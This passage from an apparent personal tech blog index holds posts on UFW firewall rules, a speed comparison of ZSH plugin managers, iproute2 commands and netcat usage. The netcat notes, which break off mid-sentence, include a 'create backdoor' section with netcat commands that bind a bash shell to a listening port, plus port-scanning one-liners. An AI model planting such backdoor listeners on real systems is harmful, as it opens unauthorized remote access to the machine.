ufw-before-input -s 199.115.117.99 -j DROP # block 184.105.*.* -A ufw-before-input -s 184.105.0.0/16 -j DROP # don\u0026#39;t delete the \u0026#39;COMMIT\u0026#39; line or these rules won\u0026#39;t be processed COMMIT   SSH Protection and Rate Limit Deny connections from an IP address that has attempted to initiate 6 or more connections in the last 30 seconds. 30s内请求达到6次，拒绝连接。\n Currently only IPv4 is supported.\n 1  ufw limit ssh/tcp   User Config /etc/ufw/user.rules and /etc/ufw/user6.rules for IPv4 and IPv6 respectively.\nDisable ping Disable icmp protocol\n1 2 3 4 5 6 7  # /etc/ufw/before.rules # ok icmp codes -A ufw-before-input -p icmp --icmp-type destination-unreachable -j DROP -A ufw-before-input -p icmp --icmp-type source-quench -j DROP -A ufw-before-input -p icmp --icmp-type time-exceeded -j DROP -A ufw-before-input -p icmp --icmp-type parameter-problem -j DROP -A ufw-before-input -p icmp --icmp-type echo-request -j DROP   Manual Default policies\n default incoming policy of deny forward policy of deny outgoing policy of allow see others in manual (icmp, icmpv6\u0026hellip;) IPV6 is allowed by default  Other useful commands\n1 2 3 4 5  man ufw # --dry-run sudo ufw reload   show 1 2 3 4 5 6 7 8  sudo ufw show REPORTS # raw, comp0lte firewall # builtins, before-rules, user-rules, after-rules, logging-rules, listening, added # raw is equivalent to iptables -n -L -v -x -t \u0026lt;table\u0026gt; ip6tables -n -L -v -x -t \u0026lt;table\u0026gt; # filter, nat, mangle, raw tables   logging  LOG_KERN syslog facility is used by default. rsyslog support may also log to /var/log/ufw.log  Enable/disable logging.\n1 2  sudo ufw logging on|off|LEVEL # level like low,medium,full,high sudo ufw allow log 22/tcp # per rule logging   rule settings If no direction is specified, the rule applies to incoming traffic\nFor rules destined for the host itself, use route keyword\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  sudo ufw allow in on eth0 from 192.168.0.0/16 ufw allow out on eth1 to 10.0.0.0/8 # add comment ufw limit 2222/tcp comment \u0026#39;SSH port\u0026#39; # simple syntax ufw allow 25/tcp # ufw allow smtp # incoming traffic rule by default ufw allow in http ufw reject out smpt # fuller syntax, based on OpenBSD\u0026#39;s PF syntax ufw deny proto tcp to any port 80 ufw deny proto tcp from 10.0.0.0/8 to 192.168.0.1 port 25 ufw deny in on tho0 to 224.0.0.1 proto igmp ufw allow proto udp from 1.2.3.5 port 5469 to 1.2.3.4 port 6459   route 1  ufw route allow in on eth1 out on eth2   Setup IP forwarding to use routing rules.\n1 2 3 4 5 6 7  # /etc/ufw/sysctl.conf net/ipv4/ip_forward=1 net/ipov6/conf/default/forwarding=1 net/ipv6/conf/all/forwarding=1 # restart ufw sudo ufw disable \u0026amp;\u0026amp; sudo ufw enable   rate limit Use reject instead of deny to let user know they\u0026rsquo;re rejected\n1 2  ufw limit ssh/tcp ufw reject auth   delete rules  Use the original rule ufw delete deny 80/tcp Delete rule use status number. sudo ufw status numbered  again for the IPv6 version of the rule    insert and prepend  prepend, equivalent to insert at number 1  app integration 1 2 3 4 5 6  ufw app list ufw allow \u0026lt;name\u0026gt; ufw allow from 192.168.0.0./16 to any app \u0026lt;name\u0026gt; ufw app info \u0026lt;name\u0026gt; sudo ufw allow in \u0026#34;Apache Full\u0026#34;   References  How To Set Up a Firewall with UFW on Ubuntu 18.04 UFW from Ubuntu help wiki UFW Essentials: Common Firewall Rules and Commands  MySQL，PostgreSQL，IMAP等几种常见服务端口设置，没啥帮助   Uncomplicated Firewall from wiki.archlinux.org  rate limit ufw limit SSH  currently only IPv4 is supported   forward rules for VPN /etc/ufw/applications.d   ","permalink":"https://blog.pseudocold.com/post/2019/ufw-notes/","tags":["linux","firewall","ufw"],"title":"UFW Notes"},{"categories":["CLI"],"contents":"A comparison of all kinds of ZSH frameworks and plugin manager. Try to find the fastest one.\nChangelog  update 1: add a FAQ section update 2: benchmark chart and feature comparison table update 3:  improve the table with missing features for antigen new zplg times result    TLDR Speed comparison of ZSH plugin mangers with 10 plugins loaded made by vintersnow@github, detail is covered in the post 最速のZsh プラグインマネージャーを求めて.\nComparison of Features and Optimizations made by me.\n   Name Manager Plugins Frameworks Supported Other Features Speed with 0 plugin     antigen bytecode compiling, static bundle loading - oh-my-zsh - 60 ms   zgen static loading - oh-my-zsh, prezto - 50 ms   antibody executed in Go, or static loading - oh-my-zsh - 50 ms   zplug cache mechanism parallel loading oh-my-zsh, prezto managing scripts 160 ms   zplugin bytecode compiling bytecode compiling, Turbo Mode (background loading) oh-my-zsh, prezto managing scripts, completions, plugin report 50 ms    Intro I\u0026rsquo;ve been trying different plugin mangers for months to find the fastest one. The content below is what I got. For the record, the conclusion is very subjective. But it\u0026rsquo;s the truth for me. I would appreciate hearing your thoughts on this. Here it begins.\nDisplay what I got after this long journey. (BTW, I has an SSD on my machine, the data should be much different on HDDs.)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55  ❯ export TIMEFMT=\u0026#39;%U user %S system %P cpu %*E total\u0026#39; ❯ for i ({1..10}) time zsh -ilc echo \u0026amp;\u0026gt;/dev/null || true 0.07s user 0.04s system 97% cpu 0.115 total 0.07s user 0.04s system 97% cpu 0.110 total 0.06s user 0.04s system 97% cpu 0.109 total 0.07s user 0.04s system 97% cpu 0.111 total 0.07s user 0.04s system 97% cpu 0.111 total 0.07s user 0.04s system 97% cpu 0.111 total 0.07s user 0.04s system 97% cpu 0.111 total 0.07s user 0.04s system 97% cpu 0.112 total 0.07s user 0.04s system 97% cpu 0.113 total 0.07s user 0.04s system 97% cpu 0.114 total ❯ zplg times Plugin loading times: 0.001 sec - dircolors-solarized 0.001 sec - base16-fzf 0.001 sec - PZT::modules/environment 0.001 sec - PZT::modules/history 0.001 sec - PZT::modules/directory 0.001 sec - PZT::modules/helper 0.003 sec - PZT::modules/spectrum 0.011 sec - PZT::modules/utility 0.001 sec - PZT::modules/osx 0.001 sec - OMZ::plugins/fancy-ctrl-z 0.004 sec - OMZ::plugins/fzf 0.005 sec - mafredri/zsh-async 0.005 sec - laggardkernel/zsh-fuzzy-search-and-edit 0.001 sec - wfxr/forgit 0.002 sec - laggardkernel/git-ignore 0.001 sec - ytet5uy4/pctl 0.001 sec - getColorCode 0.001 sec - PZT::modules/completion # only use the conf part 0.001 sec - zpm-zsh/ssh 0.001 sec - zsh-users/zsh-completions 0.001 sec - zdharma/history-search-multi-word 0.002 sec - PZT::modules/autosuggestions 0.006 sec - laggardkernel/spaceship-prompt 0.089 sec - romkatv/gitstatus # turbo mode started 0.017 sec - _local/init0 # init of pyenv, nodenv, rbenv 0.036 sec - zdharma/fast-syntax-highlighting 0.002 sec - PZT::modules/history-substring-search 0.022 sec - softmoth/zsh-vim-mode 0.017 sec - PZT::modules/fasd # compinit here 0.077 sec - _local/init1 0.011 sec - urbainvaes/fzf-marks 0.027 sec - hlissner/zsh-autopair 0.027 sec - MichaelAquilina/zsh-you-should-use 0.018 sec - marzocchi/zsh-notify 0.005 sec - OMZ::plugins/urltools Total: 0.401 sec ❯ count=$(zplg times|wc -l) \u0026amp;\u0026amp; echo $((count - 2)) # calc number of plugins 35   My experience with ZSH frameworks and plugin managers: There\u0026rsquo;re basically three kinds of startup time for ZSH.\n time taken by framework, or by plugin manger itself to parse its dialect time cost in loading plugins time taken by scripts written by ourselves  The results here are based on the first two kinds of time.\nI should mention it here that the most of startup time is taken by some time-consuming plugins, such as\n *vm, *env initialization  nvm, rvm rbenv, pyenv, nodenv   init code generation (not source, or eval those codes)  thefuck, 120ms for init generation, 1ms for eval 👍 fasd, 30~40ms for init generation   time-consuming commands  brew --prefix nvm, 600ms 🌚 brew command command-not-found-init    Frameworks Oh-My-ZSH The most famous framework with most plugins built-in. For example, autojump, z, fasd are all included, which let users choose whatever they want.\nPrezto The only framework does optimizations in plugins with sophisticated coding skill, which makes me realize I\u0026rsquo;m ignorant about ZSH:\n Refreshing .zcompdump every 20h Compiling .zcompdump as bytecode in the background Caching init script for fasd Saving *env startup time with init - --no-rehash for rbenv, pyenv, nodenv Removing the horribly time-consuming brew command from command-not-found  Prezto modules are loaded by its custom function called pmodload. source the script directly won\u0026rsquo;t work as expected.\nAnd it has a different style compared with oh-my-zsh:\n Avoiding environment variable pollution with zstyle Bundling related plugins together  module python in Prezto is composed of four parts: pyenv, conda, virtualenv, virtualenvwrapper    ZIM (I have not tested this. But bytecode compiling should help it be one of the fast frameworks.)\nZsh IMproved FrameWork. According to issue #284:\n bytecode compiling coding style focused on efficiency  Drawback: much less plugins are included compared to oh-my-zsh and Prezto.\nPlugin Managers Antigen The de facto official plugin manager. Antigen supports oh-my-zsh, plugins from github repos. No prezto module support.\nStartup time of a clean installation is about 60ms. Startup time using conf example from the README.md is about 150ms. (Exclude the time-consuming command-not-found plugin for macOS, 6 plugins are loaded, maybe with compinit.)\nNot bad, but not excellent either.\nOptimizations:\n bytecode compiling for itself to reduce the 1st kind of time No optimization for the loading of plugins  Zgen Zgen hitchhikes on oh-my-zsh and prezto. It clones those two repos, and loads their plugins/modules using methods from them. Zgen also supports plugins from github repos.\nWhat makes zgen excellent is its static loading. It generates a static init script consisting of source statements for plugins and pmodload statements for prezto modules. When ZSH starts up, zgen will source the init script directly without parsing its dialect every time, which also means you need to regenerate the init script after updating ur conf. A clean startup time is 50ms.\nOptimizations:\n static init, removes the 1st kind of time completely No optimization for the loading of plugins  Antibody Antigen in Go. It supports oh-my-zsh plugins, plugins from github repos. No support for Prezto modules.\nNote: For anyone think the plugin manager written in Go is superior to plugin manger written in ZSH. Let\u0026rsquo;s make it clear, Antibody loads plugins using ZSH statement source, which means antibody ONLY reduces the 1st kind of startup time.\nThe born of antibody may be related to the slowness of old version antigen. Antibody tries to use Go to reduces the startup time taken by plugin manger itself, cause using Go to parse and execute its dialect antibody bundle \u0026lt; ~/.zsh_plugins.txt is faster.\n(The slowness of antigen should only be its skeleton in the closet now.)\nIt adds a new loading method called static loading later. Obviously, parsing the dialect into source statements to cache it directly later, is faster than parsing the dialect every time ZSH starts up. You may guess it, this is basically what zgen is doing using ZSH. The clean startup time of both managers are very close, nearly 50ms.\nI kind of feel sorry for the author of antibody, who uses a more complicated, powerful tool to solve the problem, but later found himself defeated by an simple idea.\nOptimizations:\n Reduce the 1st kind of time with Go, or remove the 1st kind of time completely using static loading No optimization for the loading of plugins  A Detailed Comparison Between Antibody and Zgen Clean startup time without any plugin loaded:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  # antibody, source \u0026lt;(antibody init) for i ({1..10}) time zsh -ilc echo \u0026amp;\u0026gt;/dev/null zsh 0.03s user 0.02s system 118% cpu 0.047 total zsh 0.03s user 0.02s system 103% cpu 0.049 total zsh 0.03s user 0.02s system 107% cpu 0.051 total zsh 0.03s user 0.02s system 114% cpu 0.045 total zsh 0.03s user 0.02s system 102% cpu 0.049 total zsh 0.03s user 0.02s system 105% cpu 0.047 total zsh 0.03s user 0.02s system 110% cpu 0.046 total zsh 0.03s user 0.02s system 107% cpu 0.050 total zsh 0.03s user 0.02s system 106% cpu 0.049 total zsh 0.03s user 0.02s system 107% cpu 0.048 total # zgen, source \u0026#34;${HOME}/.zgen/zgen.zsh\u0026#34; for i ({1..10}) time zsh -ilc echo \u0026amp;\u0026gt;/dev/null zsh 0.03s user 0.02s system 110% cpu 0.046 total zsh 0.03s user 0.02s system 106% cpu 0.046 total zsh 0.03s user 0.02s system 106% cpu 0.048 total zsh 0.03s user 0.02s system 109% cpu 0.051 total zsh 0.03s user 0.02s system 105% cpu 0.048 total zsh 0.03s user 0.02s system 102% cpu 0.051 total zsh 0.03s user 0.02s system 106% cpu 0.047 total zsh 0.03s user 0.02s system 107% cpu 0.047 total zsh 0.03s user 0.02s system 111% cpu 0.049 total zsh 0.03s user 0.02s system 106% cpu 0.047 total   Tests using example config from getantibody.github.io\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  # example conf for antibody dynamic loading antibody bundle \u0026lt;\u0026lt; EOF caarlos0/jvm djui/alias-tips # comments are supported like this caarlos0/zsh-mkc zsh-users/zsh-completions caarlos0/zsh-open-github-pr # empty lines are skipped # remove plugin below because of time-consuming `brew` command # robbyrussell/oh-my-zsh path:plugins/aws zsh-users/zsh-syntax-highlighting zsh-users/zsh-history-substring-search EOF   Result:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53  # antibody dynamic loading for i ({1..10}) time zsh -ilc echo \u0026amp;\u0026gt;/dev/null zsh 0.05s user 0.03s system 105% cpu 0.083 total zsh 0.06s user 0.03s system 105% cpu 0.083 total zsh 0.05s user 0.03s system 104% cpu 0.082 total zsh 0.05s user 0.03s system 107% cpu 0.081 total zsh 0.05s user 0.03s system 104% cpu 0.082 total zsh 0.05s user 0.03s system 103% cpu 0.081 total zsh 0.06s user 0.03s system 107% cpu 0.083 total zsh 0.05s user 0.03s system 105% cpu 0.082 total zsh 0.05s user 0.03s system 102% cpu 0.082 total zsh 0.06s user 0.03s system 106% cpu 0.082 total # antibody static loading, source .zsh_plugins.sh directly. No auto `compint`. for i ({1..10}) time zsh -ilc echo \u0026amp;\u0026gt;/dev/null zsh 0.05s user 0.02s system 105% cpu 0.069 total zsh 0.05s user 0.03s system 107% cpu 0.071 total zsh 0.05s user 0.03s system 106% cpu 0.071 total zsh 0.05s user 0.03s system 104% cpu 0.070 total zsh 0.05s user 0.03s system 104% cpu 0.070 total zsh 0.05s user 0.03s system 108% cpu 0.072 total zsh 0.05s user 0.03s system 105% cpu 0.070 total zsh 0.05s user 0.03s system 105% cpu 0.070 total zsh 0.05s user 0.03s system 104% cpu 0.071 total zsh 0.05s user 0.03s system 106% cpu 0.072 total # zgen static loading, without `compinit`, ZGEN_AUTOLOAD_COMPINIT=0 for i ({1..10}) time zsh -ilc echo \u0026amp;\u0026gt;/dev/null zsh 0.05s user 0.03s system 105% cpu 0.075 total zsh 0.05s user 0.03s system 104% cpu 0.077 total zsh 0.05s user 0.03s system 106% cpu 0.074 total zsh 0.05s user 0.03s system 104% cpu 0.074 total zsh 0.05s user 0.03s system 105% cpu 0.076 total zsh 0.05s user 0.03s system 103% cpu 0.074 total zsh 0.05s user 0.03s system 108% cpu 0.076 total zsh 0.05s user 0.03s system 104% cpu 0.075 total zsh 0.05s user 0.03s system 107% cpu 0.077 total zsh 0.05s user 0.03s system 102% cpu 0.081 total # zgen source \u0026#34;${HOME}/.zgen/init.zsh\u0026#34; directly # without `compinit`, ZGEN_AUTOLOAD_COMPINIT=0 for i ({1..10}) time zsh -ilc echo \u0026amp;\u0026gt;/dev/null zsh 0.05s user 0.03s system 107% cpu 0.070 total zsh 0.05s user 0.03s system 106% cpu 0.073 total zsh 0.05s user 0.02s system 103% cpu 0.070 total zsh 0.05s user 0.03s system 104% cpu 0.070 total zsh 0.05s user 0.03s system 109% cpu 0.071 total zsh 0.05s user 0.03s system 105% cpu 0.070 total zsh 0.04s user 0.02s system 106% cpu 0.064 total zsh 0.04s user 0.02s system 107% cpu 0.062 total zsh 0.04s user 0.02s system 107% cpu 0.061 total zsh 0.04s user 0.02s system 107% cpu 0.063 total   We used 7 plugins here. The result is clear, static loading saves your time. The only difference between static loading in Antibody and Zgen is, Zgen the plugin manager itself needs to be sourced, the source is run by Zgen itself, and Zgen does compint for you by default. (Disable auto compinit in Zgen with ZGEN_AUTOLOAD_COMPINIT=0)\nEverything else are the same. What they do in static loading is sourcing *plugin.zsh into current shell and adding plugin folders into fpath.\nSame formula, different packagings. Zgen implements static loading with only 500 lines ZSH script, with additional Prezto support.\nInterlude Now we have examined plugin mangers trying to reduce the startup time taken by themselves. But the time taken by plugin manger itself is only a fraction of the total startup time. Just as what I wrote in the beginning, a simple brew --prefix nvm cost you 600ms, thefuck --alias cost you 120ms. No mater how efficient your plugin manger is, you still get that kind of startup delay.\nNext, I\u0026rsquo;ll examine some other plugin managers trying to reduce the 2nd kind of time taken by plugins. Keep tuned.\nZulu Zulu, a plugin manager uses bytecode compiling both for the plugin manager itself and all plugins being loaded. It only supports built-in plugins, no support oh-my-zsh or prezto plugins. What kind of plugin manger could call itself a plugin manger if it only uses builtin plugins? Let\u0026rsquo;s be practical, zulu is just a framework.\nA clean startup (without adding any plugins) time is 150ms. Ok, it\u0026rsquo;s BAD. Compared with Antigen, zulu has more optimizations but a longer startup time, which means the plugin manager itself cost too much time and the implementation is not efficient.\nOptimizations:\n bytecode compiling for plugin manger itself. Offset by its low efficient coding. bytecode compiling for plugins  Zplug Zplug uses parallel installation/updating, hooks, cache mechanism. It also supports managing scripts and binary from Github release for you. Oh-my-zsh, Prezto and plugins from Github repos are all supported. It\u0026rsquo;s very full-fledged and powerful.\nThe problem is, it\u0026rsquo;s a plugin manger begins with good ideas, like parallel and cache, results in a very, very BAD implementation. A clean startup time is 160ms. (Just source the plugin manger itself.)\nAccording to issue #368, issue #364, thread from reddit/r/zsh Zplug is slow?:\nZplug is slower than Oh-my-zsh, Prezto, Zgen. Antigen. Tests made by myself also confirmed the conclusion, it\u0026rsquo;s slower compared with the prezto, zgen with the same plugins loaded. The time chart on zplug\u0026rsquo;s Github repo is unreliable.\nI\u0026rsquo;ll quote what I said on issue issue #368 here:\n At first, I thought it as a compatibility problem of prezto modules. But after commenting all the prezto modules, I got a startup time of some 0.6 second in total, which is basically the same startup time when i used prezto. If I enable the prezto modules I use, startup time is about 1 second.\nThis is ridiculous because when I used the perzto framework, it loaded more plugins and had a time-consuming initialization of pyenv.\n Sorry, I didn\u0026rsquo;t mean to be so rude. What irritates me is, the content from zpulg\u0026rsquo;s README.md makes you hold your breath, but what I experienced is totally different from what they tout.\nAnother drawback brought by the parallel loading is that you have no definite control of the loading order of your plugins. Even the plugins loaded with same defer value are loaded parallelly.\nOptimizations:\n Negative optimization brought by terrible implementation for plugin manager itself. Parallel loading, cache mechanism for loading of plugins  Zplugin Zplugin, another full-fledge plugin manger with script, binary management, reports, completion management, turbo mode, services.\n Reports  zplugin time list time taken by each plugin zplugin report reports what\u0026rsquo;s going on in the plugins   Scripts management: download and update scripts easily from remote repos Completion management: enable, disable specific completion easily Async Turbo Mode: the real killer for time-consuming plugins  Zplugin supports plugins from oh-my-zsh, Prezto, Github repos.\nAt first, it didn\u0026rsquo;t catch my eye because it\u0026rsquo;s less popular compared to zplug, which offers most of the same features. Anyway, I already explained my relationship with zplug.\nA clean startup time is 50ms. Bytecode compiling is made for manger itself and all plugins. This helps zplugin get a slower startup time increase compared to plugin mangers without bytecode compiling for plugins.\n Async Turbo Mode, allows you to postpone loading of a plugin to the moment when processing of .zshrc is finished and prompt is being shown. Besides, there are no drawbacks of this approach – no lags, freezes, etc.\n From the data I offered at the beginning at the post. Zplugin loads my 37 plugins with a startup time of 160ms. The real time taken by all plugins is 1.040s, which means 880ms is reduced in Turbo Mode.\nOptimizations:\n bytecode compiling for plugin manger itself bytecode compiling for plugins Amazing Turbo Mode kills the time-consuming plugins like nvm, thefuck, pyenv, nodenv, etc.  FAQ Why don\u0026rsquo;t you make a benchmark? Sorry, I won\u0026rsquo;t do it, because I think it\u0026rsquo;s unnecessary. According to my analytical method, any plugin manger not trying to reduce the time taken by plugins, are not qualified in the finals. Just as what I said, the startup time taken by plugin manager itself only takes a fraction of the total time. Time-consuming plugins are the main causes of a slow startup of ZSH.\nAmong all the plugin managers I\u0026rsquo;ve tested, Zplug and Zplugin are the only two trying to solve the hardest part, which brings them to the final round. Although Zplug\u0026rsquo;s implementation is bad, I still hold the opinion that its parallel mechanism is more innovative than static loading and bytecode compiling.\nI\u0026rsquo;d like to apologize to any plugin manager developer who feels hurt by my word. I do respect their works and they are the men who make the community of ZSH bigger than any other shell. (The community here, is based on the number of plugins and plugin mangers of a interactive shell. awesome-zsh-plugins)\nWhile, I\u0026rsquo;m just a ZSH user like most other guys, and always want the best. Users don\u0026rsquo;t care which one is better among those mediocre products. Competition is cruel.\n","permalink":"https://blog.pseudocold.com/post/2019/comparison-of-zsh-plugin-managers/","tags":["zsh"],"title":"Comparison of ZSH Frameworks and Plugin Managers"},{"categories":["DevOps","CLI"],"contents":"net-tools 已经常年无人维护，新工具 iproute2 与 Linux 内核更为紧密。\niproute2 v.s. net-tools    Deprecated command Replacement commands     arp ip neighbor   ifconfig ip address, ip link   netstat ss   route ip route    Network Interface 1 2  ifconfig -a ip link show   Interface Info 1 2  ifconfig ip a # ip addr, ip address   activate interface (sudo is needed)\n1 2 3 4 5  ifconfig eth1 up ifconfig eth1 down ip link set up eth1 ip link set down eth1   Operate IP addresses on the interfaces 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  # set ipv4 addresses ifconfig eth1 add 10.0.0.1/24 ip addr[ess] add 10.0.0.1/24 dev eth1 # ip addr 可以方便的添加多个地址 ip addr add 10.0.0.1/24 broadcast 10.0.0.255 dev eth1 ip addr add 10.0.0.2/24 broadcast 10.0.0.255 dev eth1 ip addr add 10.0.0.3/24 broadcast 10.0.0.255 dev eth1 # remove ip addresses ifconfig eth1 del 0[.0.0.0] ip addr del 10.0.0.1/24 dev eth1 # show addresses ifconfig eth1 # only 1 address ip addr show dev eth1 # flush all ip address flush dev interface   IPv6 addresses operation 1 2 3 4 5 6 7 8 9 10 11 12  # ifconfig 支持添加多个v6地址 ifconfig eth1 inet6 add 2002:0db5:0:f102:1/64 ifconfig eth1 inet6 add 2003:0db5:0:f102:1/64 ip -6 addr add 2002:0db5:0:f102:1/64 dev eth1 ip -6 addr add 2003:0db5:0:f102:1/64 dev eth1 # show v6 addresses ifconfig eth1 ip -6 addr show dev eth1 ifconfig eth1 inet6 del 2002:0db5:0:f102:1/64 ip -6 addr del 2002:0db5:0:f102:1/64 dev eth1   Change MAC 1 2 3  # disable interface beforehand ifconfig eth1 hw ether 08:00:27:75:2a:66 ip link set dev eth1 address 08:00:27:75:2a:66   MTU 1 2  ifconfig etho0 mtu 2000 ip link set dev eth0 mtu 2000   Route 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  route -n netstat -rn ip route show # 这里没有提及 ss，ss不能列出路由 # route 修改默认网关，需先删除原有，再添加 route add default gw 192.168.1.2 eth0 # default 为目标 route del default gw 192.168.1.1 eth0 ip route add default via 192.168.1.2 dev eth0 ip route replace default via 192.168.1.2 dev eth0 # metric 200 # 静态路由 route add -net 172.16.32.0/24 gw 192.168.2.1 dev eth0 route del -net 172.16.32.0/24 # ip 添加静态路由和默认路由方法一致，较为统一 ip route add 172.16.32.0/24 via 192.168.1.1 dev eth0 ip route del 172.16.32.0/24   ip -6 route, route for IPv6.\nSocket netstat, ss 常用选项较为一致\n -a, --all, list both listening and non-listeing sockets -l, listening -u, -t. udp, tcp -x, --unix, unix socket -n, --numeric. -4, -6  1 2 3 4 5 6 7  netstat # list port and socket in LISTEN state netstat -l ss ss -l   ARP table address resolution\n1 2 3 4 5 6 7 8  arp -an # list and print address as number ip neigh[bour] arp -s 192.168.1.100 00:0c:29:c0:5a:ef # -s create arp -d 192.168.1.100 ip neigh add 192.168.1.100 lladdr 00:0c:29:c0:5a:ef dev eth0 ip neigh del 192.168.1.100   组播地址 1 2 3 4 5 6 7 8  ipmaddr add 33:44:00:00:00:01 dev eth0 ipmaddr del 33:44:00:00:00:01 dev eth0 ipmaddr show dev eth0 netstat -g # group ip maddr add 33:44:00:00:00:01 dev eth0 ip maddr del 33:44:00:00:00:01 dev eth0 ip maddr list dev etho0    组播也是一种IP包，也有源IP地址，目的IP地址，源IP地址为组播源的服务器IP地址，目的地址为一个特殊的IP地址，它位于 224.0.0.0 - 239.255.255.255 中，由于 224.0.0.0/8用于本地链路，即一跳的组播，239.0.0.0/8 为私有组播地址，所以实际的可用于在互联网上组播地址是225.0.0.0/8 - 238.0.0.0/8，这个组播地址不属于任何服务器或个人，它有点类似一个微信群号，任何成员（组播源）往微信群（组播IP）发送消息（组播数据），这个群里的成员（组播接收者）都会接收到此消息。\nIPTV就是组播的应用\nhttps://www.zhihu.com/question/27233903\n Formulae Who\u0026rsquo;s listening the port https://superuser.com/a/170860/733022\n1 2 3 4 5 6  netstat -lnp | grep 1234 # -p should be feeded a value on macOS # remember to use sudo sudo lsof -i :1234 # list open file on interface *:1234 lsof -Pi :1234 # -P 改善速度 # -P inhibits the conversion of port numbers to port names for network files   Add Static Route 答案可能过于古老，如Ubuntu现在使用netplan, /etc/netplan/配置路由。\nip command examples\nfor RHEL/CentOS/Fedora\n1 2  # /etc/sysconfig/network-scripts/route-eth0 10.10.20.0/24 via 192.168.50.100 dev eth0   for Ubuntu/Debian/Linux Mint (过于古老)\n1 2 3 4 5 6 7 8 9 10 11  # /etc/network/interface auto eth0 iface eth0 inet static address 192.168.50.2 netmask 255.255.255.0 gateway 192.168.50.100 ### Static Route ### up ip route add 10.10.20.0/24 via 192.168.50.100 dev eth0 # sudo /etc/init.d/network restart   References  Comparision between iproute2 and net-tools Network management from Arch Wiki Deprecated Linux networking commands and their replacements ","permalink":"https://blog.pseudocold.com/post/2018/iproute2/","tags":["linux","iproute2","networking"],"title":"iproute2 Usage"},{"categories":["DevOps","CLI","Notes"],"contents":"netcat 个人笔记\nSwiss Army knife of TCP/IP tools\n send/receive TCP/UDP packets, transfering data. TCP/UDP/SCTP/SSL client Redirect or proxy TCP/UDP/SCTP traffic to other ports or hosts network gateway, execute system commands connection broker, allowing two (or far more) clients to connect to each other through a third (brokering) server.  注: netcat 分为 openbsd-netcat 和 gnu-netcat，某些选项不通用。使用前先翻 manual.\nReferences  HakTip: Netcat - Network Port Scanning, File Transfers, and More!  所有的教程都大同小异   tldr nc man nc null-byte: How to Use Netcat, the Swiss Army Knife of Hacking Tools  一般   Comprehensive Guide on Netcat, 与上面教程内容大同小异 Netcat (nc) Command Tutorial With Examples, 略简单 Netcat 101，大同小异 netcat 命令详解  Usage General  -u to use UDP packets. -4, -6 -k (BSD variant only), keep nc to stay listening for another conn after current conn is completed  use -L listen harder   -n disable DNS lookup -e, gaping security option. Not enabled by default. -w, timeout before connection setup (quit once no one connect)  1 2  sudo apt-get remove --purge netcat-openBSD sudo apt-get install netcat   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  # send TCP packets echo \u0026#39;\u0026lt;YOUR MESSAGE HERE\u0026gt;\u0026#39; | nc \u0026lt;HOST\u0026gt; \u0026lt;PORT\u0026gt; # listen to incoming packets and chat nc -l \u0026lt;PORT\u0026gt; nc -l -p port nc hostname port # random port with -r nc -lv -r # sending contents from files nc localhost 12345 \u0026lt; example-netcat.txt # receive content and save it into a file nc -l 12345 \u0026gt; example-netcat2.txt # 从listen一侧发送数据也可行 # -w, --timeout. nc -v -w 30 -p 8888 -l \u0026lt; example.txt # receive from the conn nc -v -w 2 hostname 8888 \u0026gt; output.txt # 传送文件直接用重定向输入，没必要 base64 tar -czf - /foldername | nc -l -p 1337 nc 192.168.0.6 1337 | tar -xzf - # use pv to track progress # https://www.tecmint.com/transfer-files-between-two-linux-machines/ tar -zcf - CentOS-7-x86_64-DVD-1503.iso | pv | nc -l -p 5555 -q 5 # -q, BSD only # -q 5, wait 5s and quit nc 192.168.1.4 5555 | pv | tar -zxf - # record with better readability/verbosity nc hostname port -v -o ./output.txt # listen on a Unix socket nc -lU /var/tmp/test.sock # connect to a socket and input things nc -U /var/tmp/test.sock # custom timeout nc -w timeout_in_seconds ipaddress port   Wait Timeout Caveats -w in openbsd-netcat has no effect on -l listen option. nc will listen forever for a connection, with or without the -w flag. This may not apply on gnu-netcat.\nSpecify interface IP 1 2  # -s, use interface with ip 10.x to send packets nc -s 10.1.2.3 host.example.com 42   Port Scanning -z does port scanning, TCP by defaults. Use -uz to make UDP scanning.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  # -z , scan for listening daemons, without sending any data connections. nc -z \u0026lt;HOST\u0026gt; \u0026lt;PORT Range\u0026gt; # -v, verbose nc -v -n -z -w 2 hostname 21-1100 # -w, timeout 2s # -n, numeric-only IP addresses # delayed scan, 扫描一次的等待时间 # -i, delay time interval between lines of text sent and received nc -z -v -i 10 hostname 21-80 # udp scan nc -vzu hostname 80-90 $ echo \u0026#34;QUIT\u0026#34; | nc host.example.com 20-30 SSH-1.99-OpenSSH_3.6.1p2 Protocol mismatch. 220 host.example.com IMS SMTP Receiver Version 0.84 Ready   Proxy 1 2  # forward data from a local TCP port to the given remote host nc -l local_port | nc hostname remote-port   Talk to server  grab banner, header redirect traffic  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  nc hostname port # -v, echo -n \u0026#34;GET / HTTP/1.0\\r\\n\\r\\n\u0026#34; | nc host.example.com 80 nc localhost 25 \u0026lt;\u0026lt; EOF HELO host.example.com MAIL FROM: \u0026lt;user@host.example.com\u0026gt; RCPT TO: \u0026lt;user2@host.example.com\u0026gt; DATA Body of email. . QUIT EOF nc -l -p 1337 | nc http://www.google.com 80 # pipe input into 1337, pipe output from google back to 1338 nc -l -p 1337 | nc https://www.google.com 443 | nc -l -p 1338   Chat room 1 2 3 4 5 6  nc -l -vv -p 4444 # -l, listen # -vv, verbose # other machine nc initiator-server 4444   Create backdoor on target system -e, pipe the Linux bash shell to the connecting system\n 可能默认被移除 open a non-login, non-interactive $TERM dumb  1 2 3 4 5 6  # setup a server/listener, and pass input into shell nc -l -p 6996 -e /bin/bash nc -l -p 6996 -e \u0026#34;/usr/local/bin/bash -il\u0026#34; # or run a 